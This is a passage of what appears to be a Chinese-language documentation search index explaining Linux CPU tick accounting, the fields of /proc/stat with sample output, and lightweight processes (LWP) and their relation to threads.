\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u5411\u7528\u6237\u7a7a\u95f4\u63d0\u4f9b\u4e86\u7cfb\u7edf\u5185\u90e8\u72b6\u6001\u7684\u4fe1\u606f\uff0c\u800c /proc/stat \u63d0\u4f9b\u7684\u5c31\u662f\u7cfb\u7edf\u7684 CPU \u548c\u4efb\u52a1\u7edf\u8ba1\u4fe1\u606f cat /proc/stat #\u5b57\u6bb5\u5206\u6790 name user nice system idle iowait irq softirq steal guest guest_nice cpu 1555642 669 2099918 2037922253 108177 0 846 0 0 0 cpu0 390236 152 518894 509488581 59734 0 400 0 0 0 cpu1 389565 185 518440 509575105 9633 0 90 0 0 0 intr 7992681663 88 10 0 0 387 0 3 0 0 0 0 0 15 0 5006480 0 0 0 0 0 0 0 0 0 0 2800156 10 4339158 1 1130485 1 0 343 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ctxt 15495936005 btime 1647854161 processes 350890 procs_running 1 procs_blocked 0 softirq 390587275 1 183430424 0 16033987 5297647 0 16 140024376 0 45800824 \u8fd9\u91cc\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4e00\u4e2a\u8868\u683c\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u5217\u8868\u793a\u7684\u662f CPU \u7f16\u53f7\uff0c\u5982 cpu0\u3001cpu1 \uff0c\u800c\u7b2c\u4e00\u884c\u6ca1\u6709\u7f16\u53f7\u7684 cpu \uff0c\u8868\u793a\u7684\u662f\u6240\u6709 CPU \u7684\u7d2f\u52a0\u3002\u5176\u4ed6\u5217\u5219\u8868\u793a\u4e0d\u540c\u573a\u666f\u4e0b CPU \u7684\u7d2f\u52a0\u8282\u62cd\u6570\uff0c\u5b83\u7684\u5355\u4f4d\u662f USER_HZ\uff0c\u4e5f\u5c31\u662f 10 ms\uff081/100 \u79d2\uff09\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e0d\u540c\u573a\u666f\u4e0b\u7684 CPU \u65f6\u95f4\u3002 \u8ba1\u7b97cpu0\u7684\u4f7f\u7528\u7387\uff0c\u5c31\u628a\uff08cpu0\u4e00\u884c\u4e2d\u6240\u6709\u6570\u5b57\u52a0\u5728\u4e00\u8d77 \u51cf\u53bb idle \uff09\u9664\u4ee5 cpu0\u4e00\u884c\u4e2d\u6240\u6709\u6570\u5b57\u52a0\u5728\u4e00\u8d77 user\uff08\u901a\u5e38\u7f29\u5199\u4e3a us\uff09\uff0c\u4ee3\u8868\u7528\u6237\u6001 CPU \u65f6\u95f4\u3002 nice\uff08\u901a\u5e38\u7f29\u5199\u4e3a ni\uff09\uff0c\u4ee3\u8868\u4f4e\u4f18\u5148\u7ea7\u7528\u6237\u6001 CPU \u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b\u7684 nice \u503c\u88ab\u8c03\u6574\u4e3a 1-19 \u4e4b\u95f4\u65f6\u7684 CPU \u65f6\u95f4\u3002\u8fd9\u91cc\u6ce8\u610f\uff0cnice \u53ef\u53d6\u503c\u8303\u56f4\u662f -20 \u5230 19\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u4f18\u5148\u7ea7\u53cd\u800c\u8d8a\u4f4e\u3002 system\uff08\u901a\u5e38\u7f29\u5199\u4e3a sys\uff09\uff0c\u4ee3\u8868\u5185\u6838\u6001 CPU \u65f6\u95f4\u3002 idle\uff08\u901a\u5e38\u7f29\u5199\u4e3a id\uff09\uff0c\u4ee3\u8868\u7a7a\u95f2\u65f6\u95f4\u3002\u6ce8\u610f\uff0c\u5b83\u4e0d\u5305\u62ec\u7b49\u5f85 I/O \u7684\u65f6\u95f4\uff08iowait\uff09\u3002 iowait\uff08\u901a\u5e38\u7f29\u5199\u4e3a wa\uff09\uff0c\u4ee3\u8868\u7b49\u5f85 I/O \u7684 CPU \u65f6\u95f4\u3002 irq\uff08\u901a\u5e38\u7f29\u5199\u4e3a hi\uff09\uff0c\u4ee3\u8868\u5904\u7406\u786c\u4e2d\u65ad\u7684 CPU \u65f6\u95f4\u3002 softirq\uff08\u901a\u5e38\u7f29\u5199\u4e3a si\uff09\uff0c\u4ee3\u8868\u5904\u7406\u8f6f\u4e2d\u65ad\u7684 CPU \u65f6\u95f4\u3002 steal\uff08\u901a\u5e38\u7f29\u5199\u4e3a st\uff09\uff0c\u4ee3\u8868\u5f53\u7cfb\u7edf\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e2d\u7684\u65f6\u5019\uff0c\u88ab\u5176\u4ed6\u865a\u62df\u673a\u5360\u7528\u7684 CPU \u65f6\u95f4\u3002 guest\uff08\u901a\u5e38\u7f29\u5199\u4e3a guest\uff09\uff0c\u4ee3\u8868\u901a\u8fc7\u865a\u62df\u5316\u8fd0\u884c\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u7684\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8fd0\u884c\u865a\u62df\u673a\u7684 CPU \u65f6\u95f4\u3002 guest_nice\uff08\u901a\u5e38\u7f29\u5199\u4e3a gnice\uff09\uff0c\u4ee3\u8868\u4ee5\u4f4e\u4f18\u5148\u7ea7\u8fd0\u884c\u865a\u62df\u673a\u7684\u65f6\u95f4\u3002 intr \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u7684\u4e2d\u65ad\u6570\uff0c\u7b2c\u4e00\u5217\u4e3a\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u4e2d\u65ad\u6570\u3002\u540e\u9762\u5217\u6570\u90fd\u662f\u7279\u5b9a\u7684\u6bcf\u79cd\u4e2d\u65ad\u6570\u7684\u6b21\u6570 ctxt \u7cfb\u7edf\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570 btime \u7cfb\u7edf\u542f\u52a8\u4e86\u591a\u5c11\u65f6\u95f4 processes \u81ea\u4ece\u7cfb\u7edf\u542f\u52a8\u540efork\u4e86\u591a\u5c11\u6b21 procs_running \u5904\u4e8e\u53ef\u8fd0\u884c\u72b6\u6001\u7684\u7ebf\u7a0b\u6570 procs_blocked \u963b\u585e\u7b49\u5f85 I/O \u7684\u7ebf\u7a0b\u6570 softirq \u6b64\u884c\u663e\u793a\u6240\u6709 CPU \u7684\u8f6f\u4e2d\u65ad\u6570\u3002\u7b2c\u4e00\u5217\u662f\u6240\u6709\u8f6f\u4e2d\u65ad\u7684\u603b\u6570\u548c\uff0c\u540e\u9762\u5217\u6570\u90fd\u662f\u7279\u5b9a\u7684\u6bcf\u79cd\u4e2d\u65ad\u6570\u7684\u6b21\u6570 https://man7.org/linux/man-pages/man5/proc.5.html","title":"/proc/stat"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/0proc0stat/#procstat","text":"Linux \u4f5c\u4e3a\u4e00\u4e2a\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5c06\u6bcf\u4e2a CPU \u7684\u65f6\u95f4\u5212\u5206\u4e3a\u5f88\u77ed\u7684\u65f6\u95f4\u7247\uff0c\u518d\u901a\u8fc7\u8c03\u5ea6\u5668\u8f6e\u6d41\u5206\u914d\u7ed9\u5404\u4e2a\u4efb\u52a1\u4f7f\u7528\uff0c\u56e0\u6b64\u9020\u6210\u591a\u4efb\u52a1\u540c\u65f6\u8fd0\u884c\u7684\u9519\u89c9\u3002\u4e3a\u4e86\u7ef4\u62a4 CPU \u65f6\u95f4\uff0cLinux \u901a\u8fc7\u4e8b\u5148\u5b9a\u4e49\u7684\u8282\u62cd\u7387\uff08\u5185\u6838\u4e2d\u8868\u793a\u4e3a HZ\uff09\uff0c\u89e6\u53d1\u65f6\u95f4\u4e2d\u65ad\uff0c\u5e76\u4f7f\u7528\u5168\u5c40\u53d8\u91cf Jiffies \u8bb0\u5f55\u4e86\u5f00\u673a\u4ee5\u6765\u7684\u8282\u62cd\u6570\u3002\u6bcf\u53d1\u751f\u4e00\u6b21\u65f6\u95f4\u4e2d\u65ad\uff0cJiffies \u7684\u503c\u5c31\u52a0 1\u3002\u8282\u62cd\u7387 HZ \u662f\u5185\u6838\u7684\u53ef\u914d\u9009\u9879\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a 100\u3001250\u30011000 \u7b49\u3002\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u8bbe\u7f6e\u4e0d\u540c\u6570\u503c\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2 /boot/config \u5185\u6838\u9009\u9879\u6765\u67e5\u770b\u5b83\u7684\u914d\u7f6e\u503c\u3002\u6bd4\u5982\u5728\u6211\u7684\u7cfb\u7edf\u4e2d\uff0c\u8282\u62cd\u7387\u8bbe\u7f6e\u6210\u4e86 250\uff0c\u4e5f\u5c31\u662f\u6bcf\u79d2\u949f\u89e6\u53d1 250 \u6b21\u65f6\u95f4\u4e2d\u65ad\u3002 $ grep 'CONFIG_HZ=' /boot/config-$(uname -r) CONFIG_HZ=250 \u540c\u65f6\uff0c\u6b63\u56e0\u4e3a\u8282\u62cd\u7387 HZ \u662f\u5185\u6838\u9009\u9879\uff0c\u6240\u4ee5\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u3002\u4e3a\u4e86\u65b9\u4fbf\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\uff0c\u5185\u6838\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u8282\u62cd\u7387 USER_HZ\uff0c\u5b83\u603b\u662f\u56fa\u5b9a\u4e3a 100\uff0c\u4e5f\u5c31\u662f 1/100 \u79d2\u3002\u8fd9\u6837\uff0c\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\u5e76\u4e0d\u9700\u8981\u5173\u5fc3\u5185\u6838\u4e2d HZ \u88ab\u8bbe\u7f6e\u6210\u4e86\u591a\u5c11\uff0c\u56e0\u4e3a\u5b83\u770b\u5230\u7684\u603b\u662f\u56fa\u5b9a\u503c USER_HZ\u3002\u53ef\u4ee5\u901a\u8fc7shell\u547d\u4ee4getconf\u83b7\u5f97USER_HZ\u7684\u503c\uff1a $ getconf CLK_TCK 100 Linux \u901a\u8fc7 /proc \u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u5411\u7528\u6237\u7a7a\u95f4\u63d0\u4f9b\u4e86\u7cfb\u7edf\u5185\u90e8\u72b6\u6001\u7684\u4fe1\u606f\uff0c\u800c /proc/stat \u63d0\u4f9b\u7684\u5c31\u662f\u7cfb\u7edf\u7684 CPU \u548c\u4efb\u52a1\u7edf\u8ba1\u4fe1\u606f cat /proc/stat #\u5b57\u6bb5\u5206\u6790 name user nice system idle iowait irq softirq steal guest guest_nice cpu 1555642 669 2099918 2037922253 108177 0 846 0 0 0 cpu0 390236 152 518894 509488581 59734 0 400 0 0 0 cpu1 389565 185 518440 509575105 9633 0 90 0 0 0 intr 7992681663 88 10 0 0 387 0 3 0 0 0 0 0 15 0 5006480 0 0 0 0 0 0 0 0 0 0 2800156 10 4339158 1 1130485 1 0 343 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ctxt 15495936005 btime 1647854161 processes 350890 procs_running 1 procs_blocked 0 softirq 390587275 1 183430424 0 16033987 5297647 0 16 140024376 0 45800824 \u8fd9\u91cc\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4e00\u4e2a\u8868\u683c\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u5217\u8868\u793a\u7684\u662f CPU \u7f16\u53f7\uff0c\u5982 cpu0\u3001cpu1 \uff0c\u800c\u7b2c\u4e00\u884c\u6ca1\u6709\u7f16\u53f7\u7684 cpu \uff0c\u8868\u793a\u7684\u662f\u6240\u6709 CPU \u7684\u7d2f\u52a0\u3002\u5176\u4ed6\u5217\u5219\u8868\u793a\u4e0d\u540c\u573a\u666f\u4e0b CPU \u7684\u7d2f\u52a0\u8282\u62cd\u6570\uff0c\u5b83\u7684\u5355\u4f4d\u662f USER_HZ\uff0c\u4e5f\u5c31\u662f 10 ms\uff081/100 \u79d2\uff09\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e0d\u540c\u573a\u666f\u4e0b\u7684 CPU \u65f6\u95f4\u3002 \u8ba1\u7b97cpu0\u7684\u4f7f\u7528\u7387\uff0c\u5c31\u628a\uff08cpu0\u4e00\u884c\u4e2d\u6240\u6709\u6570\u5b57\u52a0\u5728\u4e00\u8d77 \u51cf\u53bb idle \uff09\u9664\u4ee5 cpu0\u4e00\u884c\u4e2d\u6240\u6709\u6570\u5b57\u52a0\u5728\u4e00\u8d77 user\uff08\u901a\u5e38\u7f29\u5199\u4e3a us\uff09\uff0c\u4ee3\u8868\u7528\u6237\u6001 CPU \u65f6\u95f4\u3002 nice\uff08\u901a\u5e38\u7f29\u5199\u4e3a ni\uff09\uff0c\u4ee3\u8868\u4f4e\u4f18\u5148\u7ea7\u7528\u6237\u6001 CPU \u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b\u7684 nice \u503c\u88ab\u8c03\u6574\u4e3a 1-19 \u4e4b\u95f4\u65f6\u7684 CPU \u65f6\u95f4\u3002\u8fd9\u91cc\u6ce8\u610f\uff0cnice \u53ef\u53d6\u503c\u8303\u56f4\u662f -20 \u5230 19\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u4f18\u5148\u7ea7\u53cd\u800c\u8d8a\u4f4e\u3002 system\uff08\u901a\u5e38\u7f29\u5199\u4e3a sys\uff09\uff0c\u4ee3\u8868\u5185\u6838\u6001 CPU \u65f6\u95f4\u3002 idle\uff08\u901a\u5e38\u7f29\u5199\u4e3a id\uff09\uff0c\u4ee3\u8868\u7a7a\u95f2\u65f6\u95f4\u3002\u6ce8\u610f\uff0c\u5b83\u4e0d\u5305\u62ec\u7b49\u5f85 I/O \u7684\u65f6\u95f4\uff08iowait\uff09\u3002 iowait\uff08\u901a\u5e38\u7f29\u5199\u4e3a wa\uff09\uff0c\u4ee3\u8868\u7b49\u5f85 I/O \u7684 CPU \u65f6\u95f4\u3002 irq\uff08\u901a\u5e38\u7f29\u5199\u4e3a hi\uff09\uff0c\u4ee3\u8868\u5904\u7406\u786c\u4e2d\u65ad\u7684 CPU \u65f6\u95f4\u3002 softirq\uff08\u901a\u5e38\u7f29\u5199\u4e3a si\uff09\uff0c\u4ee3\u8868\u5904\u7406\u8f6f\u4e2d\u65ad\u7684 CPU \u65f6\u95f4\u3002 steal\uff08\u901a\u5e38\u7f29\u5199\u4e3a st\uff09\uff0c\u4ee3\u8868\u5f53\u7cfb\u7edf\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e2d\u7684\u65f6\u5019\uff0c\u88ab\u5176\u4ed6\u865a\u62df\u673a\u5360\u7528\u7684 CPU \u65f6\u95f4\u3002 guest\uff08\u901a\u5e38\u7f29\u5199\u4e3a guest\uff09\uff0c\u4ee3\u8868\u901a\u8fc7\u865a\u62df\u5316\u8fd0\u884c\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u7684\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8fd0\u884c\u865a\u62df\u673a\u7684 CPU \u65f6\u95f4\u3002 guest_nice\uff08\u901a\u5e38\u7f29\u5199\u4e3a gnice\uff09\uff0c\u4ee3\u8868\u4ee5\u4f4e\u4f18\u5148\u7ea7\u8fd0\u884c\u865a\u62df\u673a\u7684\u65f6\u95f4\u3002 intr \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u7684\u4e2d\u65ad\u6570\uff0c\u7b2c\u4e00\u5217\u4e3a\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u4e2d\u65ad\u6570\u3002\u540e\u9762\u5217\u6570\u90fd\u662f\u7279\u5b9a\u7684\u6bcf\u79cd\u4e2d\u65ad\u6570\u7684\u6b21\u6570 ctxt \u7cfb\u7edf\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570 btime \u7cfb\u7edf\u542f\u52a8\u4e86\u591a\u5c11\u65f6\u95f4 processes \u81ea\u4ece\u7cfb\u7edf\u542f\u52a8\u540efork\u4e86\u591a\u5c11\u6b21 procs_running \u5904\u4e8e\u53ef\u8fd0\u884c\u72b6\u6001\u7684\u7ebf\u7a0b\u6570 procs_blocked \u963b\u585e\u7b49\u5f85 I/O \u7684\u7ebf\u7a0b\u6570 softirq \u6b64\u884c\u663e\u793a\u6240\u6709 CPU \u7684\u8f6f\u4e2d\u65ad\u6570\u3002\u7b2c\u4e00\u5217\u662f\u6240\u6709\u8f6f\u4e2d\u65ad\u7684\u603b\u6570\u548c\uff0c\u540e\u9762\u5217\u6570\u90fd\u662f\u7279\u5b9a\u7684\u6bcf\u79cd\u4e2d\u65ad\u6570\u7684\u6b21\u6570 https://man7.org/linux/man-pages/man5/proc.5.html","title":"/proc/stat"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/LWP/","text":"LWP Linux\u7684\u7ebf\u7a0b\u5b9e\u5219\u4e3a\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u53ef\u89c1\u5176\u672c\u8d28\u4ecd\u7136\u662f\u8fdb\u7a0b\uff0c\u4e0e\u666e\u901a\u8fdb\u7a0b\u76f8\u6bd4\uff0cLWP\u4e0e\u5176\u5b83\u8fdb\u7a0b\u5171\u4eab\u6240\u6709\uff08\u6216\u5927\u90e8\u5206\uff09\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u548c\u7cfb\u7edf\u8d44\u6e90\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u521b\u5efa\u591a\u4e2aLWP\uff0c\u8fd9\u6837\u5b83\u4eec\u5171\u4eab\u5927\u90e8\u5206\u8d44\u6e90\uff1bLWP\u6709\u5b83\u81ea\u5df1\u7684\u8fdb\u7a0b\u6807\u8bc6\u7b26\uff0c\u5e76\u548c\u5176\u4ed6\u8fdb\u7a0b\u6709\u7740\u7236\u5b50\u5173\u7cfb\uff1b\u8fd9\u662f\u548c\u7c7bUnix\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528vfork()\u751f\u6210\u7684\u8fdb\u7a0b\u4e00\u6837\u7684\u3002LWP\u7531\u5185\u6838\u7ba1\u7406\u5e76\u50cf\u666e\u901a\u8fdb\u7a0b\u4e00\u6837\u88ab\u8c03\u5ea6\u3002Linux\u5185\u6838\u662f\u652f\u6301LWP\u7684\u5178\u578b\u4f8b\u5b50\u3002Linux\u5185\u6838\u5728 2.0.x\u7248\u672c\u5c31\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8f7b\u91cf\u8fdb\u7a0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684clone()\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u4e0d\u540c\u7684\u53c2\u6570\u6307\u5b9a\u521b\u5efa\u8f7b\u91cf\u8fdb\u7a0b\u8fd8\u662f\u666e\u901a\u8fdb\u7a0b\uff0c\u901a\u8fc7\u53c2\u6570\u51b3\u5b9a\u5b50\u8fdb\u7a0b\u548c\u7236\u8fdb\u7a0b\u5171\u4eab\u7684\u8d44\u6e90\u79cd\u7c7b\u548c\u6570\u91cf\uff0c\u8fd9\u6837\u5c31\u6709\u4e86\u8f7b\u91cd\u4e4b\u5206\u3002\u5728\u5185\u6838\u4e2d\uff0c clone()\u8c03\u7528\u7ecf\u8fc7\u53c2\u6570\u4f20\u9012\u548c\u89e3\u91ca\u540e\u4f1a\u8c03\u7528do_fork()\uff0c\u8fd9\u4e2a\u6838\u5185\u51fd\u6570\u540c\u65f6\u4e5f\u662ffork()\u3001vfork()\u7cfb\u7edf\u8c03\u7528\u7684\u6700\u7ec8\u5b9e\u73b0\u3002 \u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e2d\uff0cLWP\u4e0e\u666e\u901a\u8fdb\u7a0b\u7684\u533a\u522b\u4e5f\u5728\u4e8e\u5b83\u53ea\u6709\u4e00\u4e2a\u6700\u5c0f\u7684\u6267\u884c\u4e0a\u4e0b\u6587\u548c\u8c03\u5ea6\u7a0b\u5e8f\u6240\u9700\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u800c\u8fd9\u4e5f\u662f\u5b83\u4e4b\u6240\u4ee5\u88ab\u79f0\u4e3a\u8f7b\u91cf\u7ea7\u7684\u539f\u56e0\u3002 \u56e0\u4e3aLWP\u4e4b\u95f4\u5171\u4eab\u5b83\u4eec\u7684\u5927\u90e8\u5206\u8d44\u6e90\uff0c\u6240\u4ee5\u5b83\u5728\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5c31\u4e0d\u9002\u7528\u4e86\uff1b\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u4f7f\u7528\u591a\u4e2a\u666e\u901a\u7684\u8fdb\u7a0b\u4e86\u3002\u4f8b\u5982\uff0c\u4e3a\u4e86\u907f\u514d\u5185\u5b58\u6cc4\u6f0f\uff08a process can be replaced by another one\uff09\u548c\u5b9e\u73b0\u7279\u6743\u5206\u9694\uff08processes can run under other credentials and have other permissions\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u628aLWP\u770b\u6210\u662f\u4e00\u4e2a\u7ebf\u7a0b\u3002\u5c31\u56e0\u4e3a\u8fd9\u4e2a\u4f7f\u5f97\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u6982\u5ff5\u6df7\u6dc6\u4e86\uff0c\u6709\u4eba\u8bf4\u7cfb\u7edf\u8c03\u5ea6\u5355\u4f4d\u662f\u8fdb\u7a0b\uff0c\u53c8\u6709\u4eba\u8bf4\u662f\u7ebf\u7a0b\uff0c\u5176\u5b9e\u7cfb\u7edf\u8c03\u5ea6\u7684\u5355\u4f4d\u4e00\u76f4\u5c31\u6ca1\u6709\u6539\u53d8\uff0c\u53ea\u662f\u540e\u6765\u90e8\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u754c\u9650\u6a21\u7cca\u4e86 \u53c2\u8003\u6587\u6863\uff1a http://www.uml.org.cn/embeded/202011244.asp https://www.daimajiaoliu.com/daima/485a207729003f8 https://www.daimajiaoliu.com/daima/4795933fc9003ec https://www.modb.pro/db/15191","title":"LWP"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/LWP/#lwp","text":"Linux\u7684\u7ebf\u7a0b\u5b9e\u5219\u4e3a\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u53ef\u89c1\u5176\u672c\u8d28\u4ecd\u7136\u662f\u8fdb\u7a0b\uff0c\u4e0e\u666e\u901a\u8fdb\u7a0b\u76f8\u6bd4\uff0cLWP\u4e0e\u5176\u5b83\u8fdb\u7a0b\u5171\u4eab\u6240\u6709\uff08\u6216\u5927\u90e8\u5206\uff09\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u548c\u7cfb\u7edf\u8d44\u6e90\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u521b\u5efa\u591a\u4e2aLWP\uff0c\u8fd9\u6837\u5b83\u4eec\u5171\u4eab\u5927\u90e8\u5206\u8d44\u6e90\uff1bLWP\u6709\u5b83\u81ea\u5df1\u7684\u8fdb\u7a0b\u6807\u8bc6\u7b26\uff0c\u5e76\u548c\u5176\u4ed6\u8fdb\u7a0b\u6709\u7740\u7236\u5b50\u5173\u7cfb\uff1b\u8fd9\u662f\u548c\u7c7bUnix\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528vfork()\u751f\u6210\u7684\u8fdb\u7a0b\u4e00\u6837\u7684\u3002LWP\u7531\u5185\u6838\u7ba1\u7406\u5e76\u50cf\u666e\u901a\u8fdb\u7a0b\u4e00\u6837\u88ab\u8c03\u5ea6\u3002Linux\u5185\u6838\u662f\u652f\u6301LWP\u7684\u5178\u578b\u4f8b\u5b50\u3002Linux\u5185\u6838\u5728 2.0.x\u7248\u672c\u5c31\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8f7b\u91cf\u8fdb\u7a0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684clone()\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u4e0d\u540c\u7684\u53c2\u6570\u6307\u5b9a\u521b\u5efa\u8f7b\u91cf\u8fdb\u7a0b\u8fd8\u662f\u666e\u901a\u8fdb\u7a0b\uff0c\u901a\u8fc7\u53c2\u6570\u51b3\u5b9a\u5b50\u8fdb\u7a0b\u548c\u7236\u8fdb\u7a0b\u5171\u4eab\u7684\u8d44\u6e90\u79cd\u7c7b\u548c\u6570\u91cf\uff0c\u8fd9\u6837\u5c31\u6709\u4e86\u8f7b\u91cd\u4e4b\u5206\u3002\u5728\u5185\u6838\u4e2d\uff0c clone()\u8c03\u7528\u7ecf\u8fc7\u53c2\u6570\u4f20\u9012\u548c\u89e3\u91ca\u540e\u4f1a\u8c03\u7528do_fork()\uff0c\u8fd9\u4e2a\u6838\u5185\u51fd\u6570\u540c\u65f6\u4e5f\u662ffork()\u3001vfork()\u7cfb\u7edf\u8c03\u7528\u7684\u6700\u7ec8\u5b9e\u73b0\u3002 \u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e2d\uff0cLWP\u4e0e\u666e\u901a\u8fdb\u7a0b\u7684\u533a\u522b\u4e5f\u5728\u4e8e\u5b83\u53ea\u6709\u4e00\u4e2a\u6700\u5c0f\u7684\u6267\u884c\u4e0a\u4e0b\u6587\u548c\u8c03\u5ea6\u7a0b\u5e8f\u6240\u9700\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u800c\u8fd9\u4e5f\u662f\u5b83\u4e4b\u6240\u4ee5\u88ab\u79f0\u4e3a\u8f7b\u91cf\u7ea7\u7684\u539f\u56e0\u3002 